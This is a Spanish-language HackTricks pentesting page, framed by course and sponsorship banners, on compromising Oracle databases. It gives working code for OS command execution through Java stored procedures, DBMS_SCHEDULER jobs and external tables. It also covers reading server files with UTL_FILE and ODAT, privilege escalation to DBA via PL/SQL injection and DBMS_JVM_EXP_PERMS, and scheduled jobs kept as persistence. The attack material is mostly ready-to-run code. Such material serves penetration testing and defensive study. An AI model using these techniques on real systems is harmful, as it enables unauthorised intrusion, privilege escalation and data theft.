<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# RCE: Procedimiento Almacenado Java

Imagina que tienes la informaci√≥n de la cuenta de administrador. En este caso, una forma muy popular de ejecutar tu comando en el servidor es escribir un procedimiento almacenado ‚Äòjava‚Äô. Esto se hace en tres etapas. Primero, crea una clase Java llamada ‚Äòoraexec‚Äô. Para hacer esto, con√©ctate a trav√©s del terminal ‚Äòsqlplus‚Äô y escribe:
```text
create or replace and resolve java source named "oraexec" as
import java.lang.*;
import java.io.*;
public class oraexec
{
public static void execCommand(String command) throws IOException
{
Runtime.getRuntime().exec(command);
}
}
/

```
A continuaci√≥n, escribe un envoltorio PL/SQL para esta clase:
```text
create or replace procedure javacmd(p_command varchar2) as language java name 'oraexec.execCommand(java.lang.String)'; /
```
Eso es todo. Ahora, para ejecutar un comando, todo lo que necesitas es enviar la siguiente consulta:
```text
exec javacmd('command');
```
Tenga en cuenta que al usar el procedimiento anterior, no podemos ver los resultados del comando ejecutado, sin embargo, puede redirigir la salida a un archivo y leerlo. Puede encontrar el c√≥digo completo del shell que permite leer y escribir archivos:

{% file src="../../.gitbook/assets/raptor_oraexec.sql" %}

Sin embargo, hay un \[script m√°s sofisticado\] \(goo.gl/EuwPRU\) que maneja la salida del comando, pero tiene un tama√±o mayor [aqu√≠](https://oracle-base.com/articles/8i/shell-commands-from-plsql).

# RCE: Scheduler

El siguiente m√©todo, que nos ayudar√° si no hay una m√°quina virtual Java, es usar 'dbmsscheduler', el programador de tareas integrado de Oracle. Para usarlo, debe tener el privilegio 'CREATE EXTERNAL JOB'. Aqu√≠ hay un ejemplo de c√≥digo que implementa la entrada de la cadena '0wned' en un archivo de texto en la ra√≠z de la unidad C:
```text
exec DBMS_SCHEDULER.create_program('RDS2008','EXECUTABLE','c:\ WINDOWS\system32\cmd.exe /c echo 0wned &gt;&gt; c:\rds3.txt',0,TRUE);
exec DBMS_SCHEDULER.create_job(job_name =&gt; 'RDS2008JOB',program_name =&gt; 'RDS2008',start_date =&gt; NULL,repeat_interval =&gt; NULL,end_date =&gt; NULL,enabled =&gt; TRUE,auto_drop =&gt; TRUE);
```
Esto crear√° y ejecutar√° un trabajo para ejecutar tu comando. Y aqu√≠ hay una opci√≥n para llamar al Programador desde otro procedimiento: 'SYS.KUPP$PROC.CREATE_MASTER_PROCESS', que es de inter√©s para nosotros, principalmente, porque te permite incrustar consultas de m√∫ltiples sentencias, es decir, aquellas que consisten en m√∫ltiples subconsultas. Te√≥ricamente, puedes ejecutar dicha consulta incluso en caso de inyecci√≥n en una aplicaci√≥n web.
```text
select SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''xxx'',''EXECUTABLE'',''cmd.exe /c echo qqq&gt;&gt;C:/scchh'',0,TRUE); DBMS_SCHEDULER.create_job(job_name=&gt;''jobx'',program_name=&gt;''xxx'',start_date=&gt;NULL,repeat_interval=&gt;NULL,end_date=&gt;NULL,enabled=&gt;TRUE,auto_drop=&gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=&gt;''xxx'');dbms_scheduler.purge_log;') from dual
```
Tenga en cuenta que, cuando utiliza el Programador, puede ejecutar este trabajo m√°s de una vez y hacerlo con cierta frecuencia. Como resultado, esto le ayudar√° a obtener una posici√≥n en el sistema probado, porque, incluso si el administrador elimina al usuario del SO, este trabajo, que se ejecuta regularmente en el sistema, lo revivir√°.

# RCE: Tablas Externas

Como √∫ltimo m√©todo para lograr la ejecuci√≥n de comandos del SO, me gustar√≠a mencionar el uso de Tablas Externas. Este m√©todo le ayudar√° m√°s adelante a descargar archivos del servidor. Necesitar√° los siguientes privilegios:

* UTL\_FILE;
* CREATE TABLE;
* un directorio reservado para el usuario.

Recordemos que el acceso al paquete 'UTL\_FILE' se proporciona por defecto a todas las cuentas con el rol 'CONNECT'. Paso uno: Verifique los directorios emitidos con la siguiente consulta:
```text
SELECT TABLE_NAME FROM ALL_TAB_PRIVS WHERE TABLE_NAME IN
(SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_TYPE='DIRECTORY')
and privilege='EXECUTE' ORDER BY GRANTEE;

TABLE_NAME
------------------------------
ALICE_DIR
```
Paso dos: Crear un archivo batch ejecutable con el comando deseado:
```text
declare
f utl_file.file_type;
s varchar2(200) := 'echo KOKOKO &gt;&gt; C:/pwned';
begin
f := utl_file.fopen('ALICE_DIR','test.bat','W');
utl_file.put_line(f,s);
utl_file.fclose(f);
end;
/
```
Paso tres: Prepara la tabla externa 'EXTT', la necesitar√°s para ejecutar el archivo:
```text
CREATE TABLE EXTT (line varchar2(256))
ORGANIZATION EXTERNAL
(TYPE oracle_loader
DEFAULT DIRECTORY ALICE_DIR
ACCESS PARAMETERS
( RECORDS DELIMITED BY NEWLINE
FIELDS TERMINATED BY ',')
LOCATION (alice_dir:'test.bat'))
/
```
Ahora, simplemente llama a tu archivo batch con el siguiente comando:
```text
SELECT * from EXTT;
```
La terminal comenzar√° a mostrar mensajes de error indicando que el sistema no puede coincidir con la tabla y el archivo invocado, pero, en este caso, no es importante, ya que el objetivo principal era abrir el archivo ejecutable, lo cual has logrado.

La utilidad 'ODAT.py' tambi√©n puede implementar este ataque. Sin embargo, requiere el privilegio 'CREATE ANY DIRECTORY', que, por defecto, solo se concede al rol de DBA, ya que intenta ejecutar el archivo desde cualquier directorio y no solo "tu" directorio.

# Leer/Escribir archivos

Ahora, procedamos a la tarea de leer y escribir archivos. Si simplemente necesitas leer o escribir un archivo en el servidor, puedes hacerlo sin procedimientos Java, los cuales, sin embargo, tambi√©n pueden manejar tales tareas. Echemos un vistazo al paquete 'UTL_FILE' que tiene la funcionalidad requerida para trabajar con el sistema de archivos. La buena noticia es que, por defecto, puede ser accedido por todos los usuarios con el rol 'PUBLIC'. La mala noticia es que, por defecto, este procedimiento no tiene acceso a todo el sistema de archivos, sino solo a un directorio predefinido por el administrador. Sin embargo, no es raro encontrar un par√°metro de directorio especificado como '*', que literalmente significa "acceso a todo". Puedes descubrir esto utilizando el siguiente comando:
```text
select name, value from v$parameter where name = 'utl_file_dir';
With appropriate rights, you can expand the access by using the following query:
alter system set utl_file_dir='*' scope =spfile;
```
La forma m√°s breve de utilizar el paquete 'UTL\_FILE' es propuesta por Alexander Polyakov:
```text
SET SERVEROUTPUT ON
declare
f utl_file.file_type;
sBuffer Varchar(8000);
begin
f:=UTL_FILE.FOPEN (''C:/‚Äô,'boot.ini','r');
loop
UTL_FILE.GET_LINE (f,sBuffer);
DBMS_OUTPUT.PUT_LINE(sBuffer);
end loop;
EXCEPTION
when no_data_found then
UTL_FILE.FCLOSE(f);
end;
/

```
Si necesitas m√°s funcionalidad con la capacidad de escribir, recomiendo buscar en Google un script llamado 'raptor_oraexec.sql'. Y siguiendo la tradici√≥n, aqu√≠ tienes una opci√≥n para usar la utilidad 'ODAT', que, como siempre, es la m√°s breve:
```text
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
```
El paquete 'UTL\_FILE' tambi√©n es muy interesante porque si tienes suerte, puedes acceder a los registros, archivos de configuraci√≥n y obtener contrase√±as de cuentas privilegiadas, como 'SYS'.

El segundo m√©todo que me gustar√≠a mencionar es volver a usar las 'Tablas Externas'. Recuerda que, al usar 'Tablas Externas', la base de datos puede acceder en modo lectura a los datos de tablas externas. Para un hacker, esto significa otra oportunidad m√°s para descargar archivos del servidor, pero este m√©todo requiere el privilegio 'CREATE ANY DIRECTORY'. Sugiero usar inmediatamente 'ODAT', ya que es estable y r√°pido:
```text
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
# Elevaci√≥n de Privilegios

Puedes utilizar varios m√©todos para elevar privilegios, que van desde desbordamientos de b√∫fer cl√°sicos y parcheo de DLL hasta ataques especializados contra bases de datos, como inyecciones PL/SQL. El tema es muy extenso y, en este art√≠culo, no me detendr√© en √©l, ya que se discute en extensos trabajos de investigaci√≥n, como los que se encuentran en los blogs de \[Lichfield\] \(goo.gl/IebQN4\) y \[Finnigan\] \(goo.gl/vXhttf\). Solo demostrar√© algunos de ellos, para que tengas una idea general. Durante las pruebas, recomiendo simplemente prestar atenci√≥n a los privilegios actuales y, en base a esto, buscar lagunas deseadas en Internet.

A diferencia de MS SQL, donde un atacante puede inyectar ‚Äòxp\_cmdshell‚Äô casi inmediatamente despu√©s de ‚ÄòSELECT‚Äô simplemente cerr√°ndolo con una comilla, Oracle DB rechaza rotundamente tales trucos. Por esta raz√≥n, no podemos recurrir cada vez a inyecciones SQL cl√°sicas aunque, en este caso, tambi√©n es posible encontrar una salida. Consideraremos inyecciones PL/SQL, que modifican el proceso de ejecuci√≥n de un procedimiento \(funci√≥n, disparador y otros objetos\) incrustando comandos aleatorios en par√°metros de entrada disponibles. \(—Å\) Sh2kerr

Para incrustar la carga √∫til, encuentra una funci√≥n donde los par√°metros de entrada no est√©n filtrados. Recuerda que Oracle SQL no permite consultas de m√∫ltiples declaraciones \(m√∫ltiples\), por lo tanto, lo m√°s probable es que necesites usar algunos procedimientos "especiales" que tengan esta caracter√≠stica. La idea principal detr√°s del ataque es la siguiente: Por defecto, a menos que se especifique lo contrario, el procedimiento se ejecuta en nombre del propietario y no en nombre del usuario que lo inici√≥. En otras palabras, si un procedimiento propiedad de la cuenta ‚ÄòSYS‚Äô est√° disponible para ejecuci√≥n y puedes incrustar tu c√≥digo en √©l, tu carga √∫til tambi√©n se ejecutar√° en el contexto de la cuenta ‚ÄòSYS‚Äô. Como ya mencion√©, esto no es lo que sucede siempre, ya que hay procedimientos con el par√°metro ‚Äòauthid current\_user‚Äô, lo que significa que este procedimiento se ejecutar√° con los privilegios del usuario actual. Sin embargo, generalmente en cada versi√≥n, puedes encontrar algunas funciones que son vulnerables a la inyecci√≥n PL/SQL. Una vista general de este proceso se muestra en la Fig. 2.

[![inject](https://hackmag.com/wp-content/uploads/2015/04/inject.png)](https://hackmag.com/wp-content/uploads/2015/04/inject.png)

En resumen, en lugar de un argumento leg√≠timo esperado, pasamos alg√∫n c√≥digo malicioso que se convierte en parte del procedimiento. Un buen ejemplo lo proporciona la funci√≥n ‚ÄòCTXSYS.DRILOAD‚Äô. Se ejecuta en nombre de ‚ÄòCTXSYS‚Äô y no filtra el par√°metro de entrada, lo que te permite elevar f√°cilmente tu nivel hasta DBA:
```text
exec ctxsys.driload.validate_stmt('grant dba to scott');
```
Sin embargo, a estas alturas, esto probablemente es historia, ya que la vulnerabilidad se encontr√≥ en 2004 y solo afecta a las versiones antiguas 8‚Äì9. Normalmente, el proceso de escalar privilegios se divide en dos partes: escribir el procedimiento que aumenta los derechos y realizar la inyecci√≥n en s√≠. Un procedimiento t√≠pico es el siguiente:
```text
CREATE OR REPLACE FUNCTION F1
RETURN NUMBER AUTHID CURRENT_USER
IS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
EXECUTE IMMEDIATE 'GRANT DBA TO TEST';
COMMIT;RETURN(1);END;
/
```
Ahora podemos inyectar un procedimiento como argumento de la funci√≥n vulnerable \(ejemplo para versiones 10x\):
```text
exec sys.kupw$WORKER.main('x','YY'' and 1=test1.f1 ‚Äì-');
```
En las versiones no tan recientes 10 y 11, hay una "agradable" excepci√≥n, o m√°s bien una vulnerabilidad, que permite ejecutar comandos en el servidor sin tener derechos de DBA: el procedimiento 'DBMS\_JVM\_EXP\_PERMS' permite a un usuario con el privilegio de 'CREATE SESSION' obtener derechos de 'JAVA IO'. El ataque se puede montar de la siguiente manera:
```text
SQL&gt; DECLARE
POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
CURSOR C1 IS SELECT
'GRANT','GREMLIN','SYS','java.io.FilePermission','&lt;FILES&gt;&gt;','execute','ENABLED' FROM DUAL;
BEGIN
OPEN C1;
FETCH C1 BULK COLLECT INTO POL;
CLOSE C1;
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
END;
/

PL/SQL procedure successfully completed.
```
Ahora que tienes los privilegios para invocar procedimientos Java, puedes provocar una respuesta del int√©rprete de Windows y ejecutar algo:
```text
SQL&gt; select dbms_java.runjava(‚Äòoracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c echo 123 &gt;c:\\hack‚Äô)from dual;
```
<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
